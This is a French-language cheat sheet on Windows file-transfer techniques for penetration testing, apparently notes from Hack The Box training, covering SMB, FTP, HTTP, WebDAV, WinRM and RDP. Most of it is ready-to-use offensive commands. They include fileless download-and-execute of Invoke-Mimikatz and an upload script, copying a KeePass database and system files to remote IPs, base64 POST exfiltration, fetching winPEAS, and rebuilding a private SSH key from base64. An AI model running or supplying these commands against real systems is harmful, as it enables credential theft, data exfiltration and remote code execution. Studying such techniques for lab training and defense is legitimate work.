# SMB
#### Créer un partage
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
net share public=C:\public /GRANT:Everyone,FULL
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#### Ajouter un partage
###### UI
1. Clique droit sur PC > Map network drive.
2. serveur: \\\192.168.92.1\TMP
3. cocher “use different credentials”
###### cmd
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
net use n: \\192.168.220.129\Finance
net use n: \\192.168.220.129\Finance /user:plaintext Password123
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
###### powershell
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"

$username = 'plaintext';
$password = 'Password123';
$secpassword = ConvertTo-SecureString $password -AsPlainText -Force;
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword;
New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

#### Copier en CMD
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
copy .\Documents\database.kdbx \\192.168.122.139\TMP\database.kbdx
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# FTP
#### Powershell
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
# Télécharger
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
# Téléverser
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Pour intéragir avec l'application FTP sans console interactive. Créer un fichier et l'exécuter
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# HTTP
#### Téléchargement
Si first-launch conf de IE pas fait. Utiliser -UseBasicParsing avec iwr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
iwr -uri http://192.168.118.3/winPEASx64.exe -Outfile winPEAS.exe

(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

#fileless
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Invoke-Mimikatz.ps1')
 (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Invoke-Mimikatz.ps1') | IEX
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

https://gist.github.com/HarmJ0y/bb48307ffa663256e239

#### Téléversement
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

#base64
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Base64
cmd.exe a une limite de 8191 charactères
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
#Encoder
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
#Transformer le base64 en fichier
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1..."))
#vérifier le hash
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Webdav (SMB/HTTP)
DavWWWRoot n'existe pas vraiment, permet seulement au driver de comprendre webdav

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
dir \\192.168.49.128\DavWWWRoot
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# LOLBAS
https://lolbas-project.github.io/#
Utiliser /upload ou /download dans la recherche
# Autres
## Powershell remoting (WINRM)
Doit être admin et être membre de Remote Management Users ou permission explicite

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~powershell
#Créer une sessions vers Database01
$Session = New-PSSession -ComputerName DATABASE01
#copie vers DATABASE01
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
#Copie depuis DATABASE01
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


## RDP
Copier Coller
Exposer un dossier local

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~shell
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Encryption
https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
